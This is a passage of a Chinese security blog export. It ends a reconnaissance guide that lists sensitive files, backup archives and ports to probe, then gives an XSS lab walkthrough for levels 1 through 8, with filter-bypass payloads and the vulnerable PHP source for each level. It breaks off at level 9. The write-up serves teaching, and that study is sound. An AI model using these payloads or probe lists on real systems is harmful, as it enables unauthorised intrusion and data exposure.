class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 启动测试</span><br><span class="line">python3 gsil.py test</span><br><span class="line"># 测试token有效性</span><br><span class="line">python3 gsil.py --verify-tokens</span><br></pre></td></tr></table></figure></li><li><p>社交平台</p><ul><li>QQ群</li><li>文库</li><li>求职网</li><li>论坛</li><li>公告</li><li>新闻</li><li>新媒体</li><li>博客</li><li>社交网络</li><li>其他相关网站</li></ul></li><li><p>敏感文件/目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">robots.txt</span><br><span class="line">crossdomin.xml</span><br><span class="line">sitemap.xml</span><br><span class="line">/WEB-INF/</span><br><span class="line">svn</span><br><span class="line">SVN</span><br><span class="line">.svn</span><br><span class="line">.svn</span><br><span class="line">entries</span><br><span class="line">源码泄漏文件</span><br><span class="line">#根据系统类型，寻找对应的漏洞，下面是tomcat的session泄露</span><br><span class="line">/examples/servlets/servlet/SessionExample/examples/</span><br><span class="line">/WEB-INF/config/jdbc.properties/WEB-INF/web.xml/WEB-INF/classes/</span><br><span class="line">WEB-INF/web.xml :Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</span><br><span class="line">WEB-INF/database.properties :数据库配置文件</span><br><span class="line">WEB-INF/classes/ :一般用来存放Java类文件(.class)</span><br><span class="line">WEB-INF/lib/ :用来存放打包好的库(.jar)</span><br><span class="line">WEB-INF/src/ :用来放源代码(.asp和.php等)</span><br><span class="line">.bzr</span><br><span class="line">.DS_store</span><br><span class="line">.hg</span><br><span class="line">.swp</span><br><span class="line">.bak</span><br><span class="line">backup.tgz</span><br><span class="line">http://example.com/static../</span><br><span class="line">www.zip</span><br><span class="line">http://www.zip</span><br><span class="line">www.tar.gz</span><br><span class="line">http://www.tar.gz</span><br><span class="line">www.rar</span><br><span class="line">http://www.rar</span><br><span class="line">web.zip</span><br><span class="line">web.rar</span><br></pre></td></tr></table></figure></li></ol><h3 id="脆弱系统-网络空间"><a href="#脆弱系统-网络空间" class="headerlink" title="脆弱系统(网络空间)"></a>脆弱系统(网络空间)</h3><p>网络空间搜索引擎</p><ul><li><p>Shodan</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.shodan.io/search?query=http.title:</span><br><span class="line">http://www.shodan.io/search?query=http.title:&quot;百度&quot; country:&quot;CN&quot;</span><br></pre></td></tr></table></figure></li><li><p>Censys</p></li><li>zoomeye</li><li>fofa</li></ul><h3 id="旁站"><a href="#旁站" class="headerlink" title="旁站"></a>旁站</h3><p>旁站是和目标网站在同一台服务器上的其它的网站。</p><ul><li><p>在线工具</p><ul><li><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">https://phpinfo.me/bing.php</a></li><li>站长之家</li></ul></li><li><p>k8旁站查询</p></li></ul><h3 id="c段"><a href="#c段" class="headerlink" title="c段"></a>c段</h3><p>C端是和目标服务器ip处在同一个C段的其它服务器。</p><p><strong>查询方式</strong></p><ul><li><p>IIS PUT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">135,139,80,8080,15672,873,8983,7001,4848,6379,2381,8161,11211,5335,5336,7809,2181,9200,50070,50075,5984,2375,7809,16992,16993#自定义端口</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>北极熊扫描器 </p><p>这是一款国人写的扫描器，不得不说这款扫描器误报率是真的高。通过一些实战我发现这款扫描器不错的是C端扫描，可以获取网站标题、服务环境、程序类型</p></li><li><p>Nmap</p></li></ul><h2 id="4-企业信息"><a href="#4-企业信息" class="headerlink" title="4. 企业信息"></a>4. 企业信息</h2><h3 id="天眼查"><a href="#天眼查" class="headerlink" title="天眼查"></a><a href="https://www.tianyancha.com/" target="_blank" rel="noopener">天眼查</a></h3><p>天眼查是一款“都能用的商业安全工具”，根据用户的不同需求，实现了企业背景、企业发展、司法风险、经营风险、经营状况、知识产权方面等多种数据维度的检索。</p><h3 id="企业信用信息公示系统"><a href="#企业信用信息公示系统" class="headerlink" title="企业信用信息公示系统"></a><a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener">企业信用信息公示系统</a></h3><p><strong>参考文章</strong>：</p><p><a href="https://bbs.ichunqiu.com/thread-27820-1-1.html" target="_blank" rel="noopener">漫谈前期信息收集</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651072880&amp;idx=1&amp;sn=f09292313658c92db3e481a2f24db988&amp;chksm=bd1fbbfb8a6832eda1b31ca572a50ec9ec8978713c7d4068bd5de1f5008ad29e3f049cdf6341&amp;mpshare=1&amp;scene=23&amp;srcid=##" target="_blank" rel="noopener">我的信息搜集之道</a></p><p><a href="https://www.4hou.com/technology/8535.html" target="_blank" rel="noopener">渗透测试工程师子域名收集指南</a></p><p><a href="https://gorgias.me/2017/12/05/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">子域名收集笔记</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS挑战之旅</title>
      <link href="/2019/05/20/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/"/>
      <url>/2019/05/20/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><h3 id="没有任何过滤"><a href="#没有任何过滤" class="headerlink" title="没有任何过滤"></a>没有任何过滤</h3><p>根据提示点击图片</p><p><img src="/2019/05/20/XSS挑战之旅/1558054268267.png" alt="1558054268267"></p><p>跳转到如下页面</p><p><img src="/2019/05/20/XSS挑战之旅/1558054405501.png" alt="1558054405501"></p><p>发现url通过get方法传递参数</p><p>修改参数为666</p><p><img src="/2019/05/20/XSS挑战之旅/1558054498678.png" alt="1558054498678"></p><p>发现在页面中有输出相应内容，可以看出无需闭合双引号，构造如下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level1.php?name=&lt;/h2&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;h2&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558054637265.png" alt="1558054637265"></p><p>没有任何过滤，成功执行payload</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;欢迎用户"</span>.$str.<span class="string">"&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：没有做任何过滤</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><h3 id="部分过滤"><a href="#部分过滤" class="headerlink" title="部分过滤"></a>部分过滤</h3><p>输入内容666</p><p><img src="/2019/05/20/XSS挑战之旅/1558054961618.png" alt="1558054961618"></p><p>发现有两处输出相应内容的地方，第一处和上一关相同，尝试下同一paylaod</p><p><img src="/2019/05/20/XSS挑战之旅/1558055118753.png" alt="1558055118753"></p><p>发现<code>&lt;&gt;</code>被实体化转义掉了，这一处无法再进行构造了。</p><p>接下来对另一处进行构造</p><p><img src="/2019/05/20/XSS挑战之旅/1558055268881.png" alt="1558055268881"></p><p>发现<code>&lt;&gt;</code>没有被转义，构造如下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558055385539.png" alt="1558055385539"></p><p>成功执行payload，便于查看代码，我把alert去掉</p><p><img src="/2019/05/20/XSS挑战之旅/1558055539475.png" alt="1558055539475"></p><p>可以看到成功闭合前后标签，所以script标签里的js代码可以成功执行</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value="搜索"/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>有两个输出，第一个输出使用htmlspeciachars()进行转义，第二个没有任何过滤，可以在这里进行构造payload。</p><p>两种方法：</p><ol><li><p>不逃逸input标签，闭合引号添加事件触发xss</p><p>鼠标移动至该标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>点击触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>点击输入框</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>等等很多事件，这里贴个网上的链接<a href="https://www.smi1e.top/xss-payload/" target="_blank" rel="noopener">XSS-Payload</a></p></li><li><p>逃逸出input标签,使用其他标签触发xss</p><p><code>&lt;script&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&quot;</span><br></pre></td></tr></table></figure><p><code>&lt;img&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;//</span><br></pre></td></tr></table></figure><p><code>&lt;a&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;xss&lt;/a&gt;//</span><br><span class="line">&quot;&gt;&lt;a href=&quot;&quot; onmouseover=&quot;alert(1)&quot;&gt;xss&lt;/a&gt;//</span><br></pre></td></tr></table></figure><p>等等</p></li></ol><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><h3 id="实体化转义绕过"><a href="#实体化转义绕过" class="headerlink" title="实体化转义绕过"></a>实体化转义绕过</h3><p><img src="/2019/05/20/XSS挑战之旅/1558056793437.png" alt="1558056793437"></p><p>看起来跟level一样，试一下闭合掉value属性</p><p><img src="/2019/05/20/XSS挑战之旅/1558057130653.png" alt="1558057130653"></p><p>闭合语句虽然没有问题，但是看起来被转义掉了</p><p><img src="/2019/05/20/XSS挑战之旅/1558056967968.png" alt="1558056967968"></p><p>双引号被转义，再尝试一下单引号<code>&#39;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&apos;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558057294923.png" alt="1558057294923"></p><p>可以看出来 <code>value=&quot;&quot;</code> 成功闭合，但是 <code>&lt;&gt;</code> 依旧被转义</p><p>再尝试另一种办法，添加事件属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onmouseover=&apos;alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558057537275.png" alt="1558057537275"></p><p>可以看到成功触发事件属性里的js代码</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">"&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='"</span>.htmlspecialchars($str).<span class="string">"'&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>两个输出点都做了htmlspecialchars()转义，但是第二个拼接的语句使用了单引号<code>&#39;</code>，而且htmlspecialchars()函数使用默认参数不会对单引号进行转义，所以可以使用单引号闭合前面的属性</p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><h3 id="事件属性逃逸"><a href="#事件属性逃逸" class="headerlink" title="事件属性逃逸"></a>事件属性逃逸</h3><p>跟上关很像，试一下闭合标签</p><p><img src="/2019/05/20/XSS挑战之旅/1558057712688.png" alt="1558057712688"></p><p>发现<code>&lt;&gt;</code>全部被过滤掉了，那就使用事件属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>成功执行payload</p><p><img src="/2019/05/20/XSS挑战之旅/1558096380758.png" alt="1558096380758"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>第二个输出点对<code>&lt;&gt;</code>进行了替换，使用事件属性进行构造payload</p><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><p>构造如下payload</p><p><img src="/2019/05/20/XSS挑战之旅/1558096540426.png" alt="1558096540426"></p><p>发现只有script被和谐了， ~ o(<em>￣▽￣</em>)ブ</p><p>使用非<code>&lt;script&gt;</code>的html标签绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed src=javascript:alert(/XSS/);&gt;//</span><br><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;xss&lt;/a&gt;//</span><br><span class="line">&quot;&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558098248009.png" alt="1558098248009"></p><p>使用触发事件绕过</p><p><img src="/2019/05/20/XSS挑战之旅/1558098351438.png" alt="1558098351438"></p><p>发现on被过滤，大小写也不行，暂没有找到不用on的😂</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>首先使用strtolower()函数把字符串转换为小写，然后对<code>&lt;script</code>和<code>on</code>进行replace替换，那就用不了事件属性了，只能使用闭合标签的方式</p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>script被过滤</p><p><img src="/2019/05/20/XSS挑战之旅/1558100639552.png" alt="1558100639552"></p><p>src被过滤</p><p><img src="/2019/05/20/XSS挑战之旅/1558100187489.png" alt="1558100187489"></p><p>href被过滤</p><p><img src="/2019/05/20/XSS挑战之旅/1558100233619.png" alt="1558100233619"></p><p>on被过滤，事件属性不行了</p><p><img src="/2019/05/20/XSS挑战之旅/1558100422464.png" alt="1558100422464"></p><p>有一点点尬住了，看一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没有使用strtolower()函数，可以大小写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed SRC=javascript:alert(/XSS/);&gt;//</span><br><span class="line">&quot; Onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558102420262.png" alt="1558102420262"></p><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>试一下事件属性</p><p><img src="/2019/05/20/XSS挑战之旅/1558105060724.png" alt="1558105060724"></p><p>on没了，被替换为空，接着试一下标签逃逸</p><p><img src="/2019/05/20/XSS挑战之旅/1558105341248.png" alt="1558105341248"></p><p>src和script也没了</p><p>想到了双写，成功绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed ssrcrc=javasscriptcript:alert(/XSS/);&gt;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558105662485.png" alt="1558105662485"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str =strtolower( $_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">""</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">""</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">""</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">""</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>替换了一系列关键字，但是却替换为空值，所以可以利用双写绕过</p><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><h3 id="属性值编码绕过"><a href="#属性值编码绕过" class="headerlink" title="属性值编码绕过"></a>属性值编码绕过</h3><p>这关有点不一样了</p><p><img src="/2019/05/20/XSS挑战之旅/1558105893509.png" alt="1558105893509"></p><p>试一下标签逃逸</p><p><img src="/2019/05/20/XSS挑战之旅/1558106118797.png" alt="1558106118797"></p><p>script和href被替换，再尝试on、src、<code>&quot;</code> 都会被替换，大小写也无法绕过</p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>第一处有html实体化转义，无法逃脱出来。第二处先转换大小写，然后黑名单过滤特殊字符和双引号；参考别人的文章，发现可以对HTML属性的值进行实体编码绕过</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558237810579.png" alt="1558237810579"></p><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><h3 id="格式验证绕过"><a href="#格式验证绕过" class="headerlink" title="格式验证绕过"></a>格式验证绕过</h3><p><img src="/2019/05/20/XSS挑战之旅/1558248807926.png" 